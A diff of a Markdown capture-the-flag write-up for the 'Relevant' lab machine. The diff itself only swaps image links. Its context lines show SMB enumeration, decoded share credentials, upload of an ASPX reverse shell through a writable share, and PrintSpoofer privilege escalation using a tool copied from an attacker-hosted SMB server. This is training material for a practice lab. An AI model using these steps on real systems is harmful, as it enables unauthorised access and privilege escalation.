@@ -38,7 +38,7 @@ nmap -T4 -p- relevant.thm -Pn -v
 - **`Pn`** – Assumes the target is online instead of relying on ICMP (ping), which is often blocked by firewalls.
 - **`v`** – Displays verbose output so progress can be monitored during the scan.
 
-<img width="1400" alt="r01" src="image/r01.png">
+<img width="500" alt="r01" src="Images/r01.png">
 
 After discovering the open ports, I performed a second scan to identify service versions and gather additional information.
 
@@ -118,7 +118,7 @@ Add the hostname to your `/etc/hosts` file for easier access:
 
 Visiting the web server reveals a default IIS page:
 
-!image.png
+<img width="700" alt="r02" src="Images/r02.png">
 
  Attempted directory brute forcing using **Gobuster**
 
@@ -164,7 +164,7 @@ During penetration testing, `smbclient` is commonly used to:
 smbclient -L //relevant.thm
 ```
 
-!image.png
+<img width="700" alt="r03" src="Images/r03.png">
 
 Here, we see a listing of common shares, but there is one specific share that is very unusual named `nt4wrksv` 
 
@@ -188,7 +188,7 @@ It can be used to identify:
 enum4linux -a relevant.thm
 ```
 
-!image.png
+<img width="700" alt="r04" src="Images/r04.png">
 
 The enumeration produced very little useful information.
 
@@ -210,7 +210,7 @@ smbclient //relevant.thm/nt4wrksv -N
 
 - **`N`** tells `smbclient` not to prompt for a password and instead attempt an anonymous connection.
 
-!image.png
+<img width="700" alt="r05" src="Images/r05.png">
 
 The connection succeeded, allowing access to the share without authentication.
 
@@ -234,7 +234,7 @@ get passwords.txt
 
 After opening the file, the contents appeared to be Base64 encoded rather than plain text.
 
-!image.png
+<img width="700" alt="r06" src="Images/r06.png">
 
 To verify this, I decoded both strings:
 
@@ -244,7 +244,7 @@ echo 'Qm9iIC0gIVBAJCRXMHJEITEyMw==' | base64 -d
 echo 'QmlsbCAtIEp1bzRubmFNNG40MjA2OTY5NjkhJCQk' | base64 -d
 ```
 
-!image.png
+<img width="700" alt="r07" src="Images/r07.png">
 
 The decoded output revealed valid credentials:
 
@@ -296,7 +296,7 @@ Rather than immediately attempting exploitation, it's always good practice to ve
 
 The `-L` option lists all available shares after authenticating as the specified user.
 
-!image.png
+<img width="700" alt="r08" src="Images/r08.png">
 
 Bob successfully authenticated to the SMB service.
 
@@ -324,7 +324,7 @@ xfreerdp /v:relevant.thm /u:Bob /p:'!P@$$W0rD!123'
 - `/u:` Username
 - `/p:` Password
 
-!image.png
+<img width="700" alt="r09" src="Images/r09.png">
 
 Authentication succeeded, but the connection was denied, meaning that this specific account doesn’t have the Allow log on through Remote Desktop Services” rule enabled 
 
@@ -334,7 +334,7 @@ The same test was performed using Bill's credentials.
 xfreerdp /v:relevant.thm /u:Bill /p:'Juo4nnaM4n420696969!$$$'
 ```
 
-!image.png
+<img width="700" alt="r10" src="Images/r10.png">
 
 The login failed.
 
@@ -368,7 +368,7 @@ Once connected, I attempted to reset Bill's password.
 setuserinfo2 Bill 23 "NewPassw0rd!"
 ```
 
-!image.png
+<img width="700" alt="r11" src="Images/r11.png">
 
 The password change failed.
 
@@ -382,7 +382,7 @@ As another method of changing Bill's password, I tested the Samba password utili
 smbpasswd -r relevant.thm -U Bill
 ```
 
-!image.png
+<img width="700" alt="r12" src="Images/r12.png">
 
 The password couldn’t be changed 
 
@@ -392,7 +392,7 @@ Since Bob’s credentials are valid, I will be using a tool named `smbmap` ,whic
 smbmap -H relevant.thm -u Bob -p '!P@$$W0rD!123'
 ```
 
-!image.png
+<img width="700" alt="r13" src="Images/r13.png">
 
 SMBMap showed that Bob has **Read** and **Write** permissions on the **nt4wrksv** share.
 
@@ -417,7 +417,7 @@ ls
 
 ```
 
-!image.png
+<img width="700" alt="r14" src="Images/r14.png">
 
 The upload was successful
 
@@ -427,7 +427,7 @@ Now, to confirm that this is linked to IIS, I can use the web browser:
  http://relevant.thm/nt4wrksv/passwords.txt:49663
 ```
 
-!image.png
+<img width="700" alt="r15" src="Images/r15.png">
 
 - I used the passwords.txt file to confirm because my file would not appear on the web for some reason
 
@@ -460,7 +460,7 @@ For this target:
 
 Because the target is running Microsoft IIS, an **ASPX payload** is the appropriate choice.
 
-!image.png
+<img width="700" alt="r16" src="Images/r16.png">
 
 ### 2. Uploading the Payload
 
@@ -472,7 +472,7 @@ put shell.aspx
 exit
 ```
 
-!image.png
+<img width="700" alt="r17" src="Images/r17.png">
 
 ### 3. Starting the Listener
 
@@ -501,7 +501,7 @@ Finally, I navigated to:
 http://relevant.thm:49663/nt4wrksv/shell.aspx
 ```
 
-!image.png
+<img width="700" alt="r18" src="Images/r18.png">
 
 Now that I have access, I can locate the user flag
 
@@ -523,7 +523,7 @@ The quickest way to do this is with:
 whoami /priv
 ```
 
-!image.png
+<img width="700" alt="r19" src="Images/r19.png">
 
 One privilege immediately stood out:
 
@@ -555,7 +555,7 @@ Since the binary was not already available on the target machine, I first downlo
 wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe -O PrintSpoofer.exe
 ```
 
-!image.png
+<img width="700" alt="r20" src="Images/r20.png">
 
 The target machine needs a way to retrieve the executable.
 
@@ -571,7 +571,7 @@ impacket-smbserver share $(pwd)
 
 It quickly creates an SMB file share directly from the current directory, allowing Windows machines to copy files from the attacker's system.
 
-!image.png
+<img width="700" alt="r21" src="Images/r21.png">
 
 With the SMB server running, I copied the executable from Kali to the compromised Windows machine.
 
@@ -583,7 +583,7 @@ copy \\10.6.46.188\share\PrintSpoofer.exe C:\Windows\Temp\PrintSpoofer.exe
 
 The Windows Temp directory is commonly writable by standard users, making it a convenient location for temporary tools during post-exploitation.
 
-!image.png
+<img width="700" alt="r22" src="Images/r22.png">
 
 Once the executable had been copied successfully, I launched it.
 
@@ -596,7 +596,7 @@ C:\Windows\Temp\PrintSpoofer.exe -i -c cmd
 - **`i`** – Starts an interactive session.
 - **`c cmd`** – Executes a new Command Prompt after privilege escalation.
 
-!image.png
+<img width="700" alt="r23" src="Images/r23.png">
 
 The exploit successfully abused `SeImpersonatePrivilege` and spawned a new Command Prompt running as:
 
